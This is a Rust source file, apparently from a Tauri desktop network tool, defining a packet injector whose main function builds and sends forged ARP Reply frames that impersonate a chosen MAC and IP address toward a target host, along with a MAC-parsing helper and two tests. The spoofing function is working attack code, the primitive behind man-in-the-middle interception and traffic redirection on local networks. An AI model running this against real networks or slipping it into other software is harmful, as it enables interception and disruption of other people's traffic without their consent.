// src-tauri/src/infrastructure/network/packet_injector.rs

use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

pub struct PacketInjector;

impl PacketInjector {
    // Envia un paquete ARP Reply falsificado.
    // Nota: best-effort. Si el driver o permisos no lo permiten, se ignora sin panicar.
    pub fn send_fake_arp(
        interface: &NetworkInterface,
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        spoofed_mac: MacAddr,
        spoofed_ip: Ipv4Addr,
    ) {
        let (mut tx, _) = match datalink::channel(interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => return,
            Err(_) => return,
        };

        // Ethernet: 14 bytes header + ARP: 28 bytes => 42 bytes
        let mut eth_buffer = [0u8; 42];
        let Some(mut eth_packet) = MutableEthernetPacket::new(&mut eth_buffer) else {
            return;
        };

        eth_packet.set_destination(target_mac);
        eth_packet.set_source(spoofed_mac);
        eth_packet.set_ethertype(EtherTypes::Arp);

        let mut arp_buffer = [0u8; 28];
        let Some(mut arp_packet) = MutableArpPacket::new(&mut arp_buffer) else {
            return;
        };

        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Reply);

        // Sender (suplantado)
        arp_packet.set_sender_hw_addr(spoofed_mac);
        arp_packet.set_sender_proto_addr(spoofed_ip);

        // Target
        arp_packet.set_target_hw_addr(target_mac);
        arp_packet.set_target_proto_addr(target_ip);

        eth_packet.set_payload(arp_packet.packet());
        let _ = tx.send_to(eth_packet.packet(), Some(interface.clone()));
    }

    // Convierte una MAC string a `MacAddr`. Si falla, devuelve `MacAddr::zero()`.
    pub fn parse_mac(mac: &str) -> MacAddr {
        let clean = mac.trim().replace("-", ":");
        clean.parse().unwrap_or_else(|_| MacAddr::zero())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_mac_accepts_dash_or_colon() {
        assert_eq!(
            PacketInjector::parse_mac("AA-BB-CC-DD-EE-FF"),
            PacketInjector::parse_mac("AA:BB:CC:DD:EE:FF")
        );
    }

    #[test]
    fn parse_mac_invalid_returns_zero() {
        assert_eq!(PacketInjector::parse_mac("BAD"), MacAddr::zero());
    }
}

